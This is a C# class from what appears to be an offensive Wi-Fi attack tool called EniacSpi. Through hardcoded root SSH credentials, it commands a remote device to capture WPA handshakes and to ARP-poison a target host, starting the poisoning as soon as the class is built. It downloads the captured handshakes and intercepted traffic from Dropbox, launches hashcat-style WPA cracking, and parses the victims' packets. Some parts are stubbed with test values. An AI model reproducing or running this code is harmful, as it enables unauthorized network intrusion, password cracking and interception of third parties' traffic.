using EniacSpi.Interfaces;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Threading.Tasks;
using oclHashcatNet.Extensions;
using System.IO;
using System.Web;
using Dropbox.Api;
using Dropbox.Api.Files;
using Renci.SshNet;
using Renci.SshNet.Common;
using SharpPcap.LibPcap;
using PacketDotNet;
using System.Collections.Concurrent;

namespace EniacSpi.Objects
{
    public class Host : IHost
    {
        private ConnectionInfo connectionInfo;

        public Host(Socket socket, string name)
        {
            this.Socket = socket;
            this.Name = name;
            this.WPAcrack = new WPAcrack();
            this.TrafficQueue = new ConcurrentQueue<PacketData>();
            this.NetworkInfiltrationStatusQueue = new ConcurrentQueue<WPACrackStatus>();
            AvailableNetworks = new List<INetworkInformation>();
            AvailableTargetHosts = new List<IHostInformation>();
            this.WPAcrack.Status.PropertyChanged += Status_PropertyChanged;

            AvailableNetworks.Add(new NetworkInformation() { SSID = "testSSID", MAC = "TEST-AABBCC-DD1234", Security = "WPA/WPA2(test)", Signal = 10, CrackProgressStatus = 0, CrackProgressEnd = 1 });
            this.SelectedNetwork = AvailableNetworks.FirstOrDefault();
            AvailableTargetHosts.Add(new HostInformation { MAC = "TEST-AABBCC-DD1235" });
            this.SelectedTargetHost = AvailableTargetHosts.FirstOrDefault();

            this.connectionInfo = new ConnectionInfo("192.168.2.14", 22, "root", new PasswordAuthenticationMethod("root", "toor"));
            StartPoison();
        }

        private void Status_PropertyChanged(object sender, System.ComponentModel.PropertyChangedEventArgs e)
        {
            this.NetworkInfiltrationStatusQueue.Enqueue((WPACrackStatus)sender);
        }

        public WPAcrack WPAcrack { get; }
        public ConcurrentQueue<PacketData> TrafficQueue { get; private set; }
        public ConcurrentQueue<WPACrackStatus> NetworkInfiltrationStatusQueue { get; private set; }

        public string Name { get; }
        public string Address
        {
            get
            {
                //return Socket.RemoteEndPoint.ToString();
                return "test";
            }
        }

        public IList<INetworkInformation> AvailableNetworks { get; }

        public IList<IHostInformation> AvailableTargetHosts { get; }

        public IHostInformation SelectedTargetHost { get; set; }

        public INetworkInformation SelectedNetwork { get; set; }

        public async Task<string> StartCracking()
        {
            if (this.IsCracking)
                StopCracking();

            string result;
            using (SshClient client = new SshClient(this.connectionInfo))
            {
                try
                {
                    client.Connect();
                    result = client.CreateCommand(String.Format("EniacSpi CaptureHandshake {0}", this.SelectedNetwork.MAC)).Execute();
                    client.Disconnect();
                }
                catch (SocketException ex)
                {
                    //return $"{ex.HResult}: Target machine actively refused SSH connection";
                }
                catch (SshAuthenticationException ex)
                {
                    //return $"{ex.HResult}: Failed to authenticate SSH request";
                }
                catch (Exception ex)
                {
                    //return $"{ex.HResult}: Failed to start Poison attack";
                }
            }

            //if (result != "Success")
                //return $"Could not capture a handshake for {this.SelectedNetwork.MAC}";

            // download /this.Name/this.SelectedNetwork.MAC/capture.extension as tempCapture.extension to C:/Hashcat/
            var dropboxClient = HttpContext.Current.Application["DropboxClient"] as DropboxClient;
            try
            {
                var response = await dropboxClient.Files.DownloadAsync(new Dropbox.Api.Files.DownloadArg(String.Format("/{0}/{1}/capture.hccap", this.Name, this.SelectedNetwork.MAC)));

                var contentBytes = await response.GetContentAsByteArrayAsync();
                FileStream fileStream = System.IO.File.Create($@"C:\{this.Name}\{this.SelectedNetwork.MAC}\{this.SelectedTargetHost.MAC}\capture.hccap", (int)contentBytes.Length);
                fileStream.Write(contentBytes, 0, contentBytes.Length);
                fileStream.Close();
            }
            catch (ApiException<DownloadError.Path> ex)
            {
               // return String.Format("{0}: The hccap file does not exist in the dropbox archive. Try again later.", ex.HResult);
            }
            catch (Exception ex)
            {
               // return String.Format("{0}: {1}", ex.HResult, ex.Message);
            }

            //File.Move($@"C:\{this.Name}\{this.SelectedNetwork.MAC}\{this.SelectedTargetHost.MAC}\capture.hccap", $@"C:\Hashcat\cudaHashcat\capture.hccap");

            // start cracking
            this.WPAcrack.Start();

            return "Success";
        }

        public void StopCracking()
        {
            this.WPAcrack.Stop();
        }

        public bool IsCracking { get { return this.WPAcrack.Status.Condition == WPAcrackCondition.Running; } }

        public string StartPoison()
        {
            using (SshClient client = new SshClient(this.connectionInfo))
            {
                try
                {
                    client.Connect();
                    var result = client.CreateCommand(String.Format("EniacSpi ARPpoison {0} {1}", this.SelectedTargetHost.MAC, this.SelectedNetwork.MAC)).Execute();
                    client.Disconnect();
                }
                catch (SocketException ex)
                {
                    return $"{ex.HResult}: Target machine actively refused SSH connection";
                }
                catch (SshAuthenticationException ex)
                {
                    return $"{ex.HResult}: Failed to authenticate SSH request";
                }
                catch (Exception ex)
                {
                    return $"{ex.HResult}: Failed to start Poison attack";
                }
            }

            DropboxEvents.OnDropboxChanged(TargetHostTrafficReceived);
            return "Success";
        }

        private async void TargetHostTrafficReceived()
        {
            var dropboxClient = HttpContext.Current.Application["DropboxClient"] as DropboxClient;
            try
            {
                var response = await dropboxClient.Files.DownloadAsync(new Dropbox.Api.Files.DownloadArg(String.Format("/{0}/{1}/{2}/package.pcap", this.Name, this.SelectedNetwork.MAC, this.SelectedTargetHost.MAC)));

                var fileName = $@"C:\{this.Name}\{this.SelectedNetwork.MAC}\{this.SelectedTargetHost.MAC}\package.pcap";
                Directory.CreateDirectory(Path.GetDirectoryName(fileName));
                var contentBytes = await response.GetContentAsByteArrayAsync();
                FileStream fileStream = System.IO.File.Create(fileName, (int)contentBytes.Length);
                fileStream.Write(contentBytes, 0, contentBytes.Length);
                fileStream.Close();

                //do pcap parsing and SignalR here
                CaptureFileReaderDevice reader = new CaptureFileReaderDevice(fileName);
                reader.OnPacketArrival += Reader_OnPacketArrival;
                reader.StartCapture();
                fileStream.Close();
            }
            catch (Exception)
            {
                return;
            }
        }

        private void Reader_OnPacketArrival(object sender, SharpPcap.CaptureEventArgs e)
        {
            PacketData packetData = new PacketData();
            packetData.Length = e.Packet.Data.Length;
            packetData.Time = e.Packet.Timeval.Date;

            var packet = Packet.ParsePacket(e.Packet.LinkLayerType, e.Packet.Data);
            
            var ipPacket = (IpPacket)packet.Extract(typeof(IpPacket));
            if (ipPacket != null)
            {
                packetData.DestinationIp = ipPacket.DestinationAddress;
                packetData.SourceIp = ipPacket.SourceAddress;
                packetData.Protocol = ipPacket.Protocol;
            }

            var tcpPacket = (TcpPacket)packet.Extract(typeof(TcpPacket));
            if (tcpPacket != null)
            {
                packetData.DestinationPort = tcpPacket.DestinationPort;
                packetData.SourcePort = tcpPacket.SourcePort;
            }

            //udpPacket processing etc

            this.TrafficQueue.Enqueue(packetData);
        }

        public bool IsConnected { get { return isConnected(this.Socket); } }

        private static bool isConnected(Socket socket)
        {
            try
            {
                socket.Send(new byte[] { 0 });
            }
            catch
            {
                return false;
            }
            return true;
        }


        public Socket Socket { get; set; }
    }
}
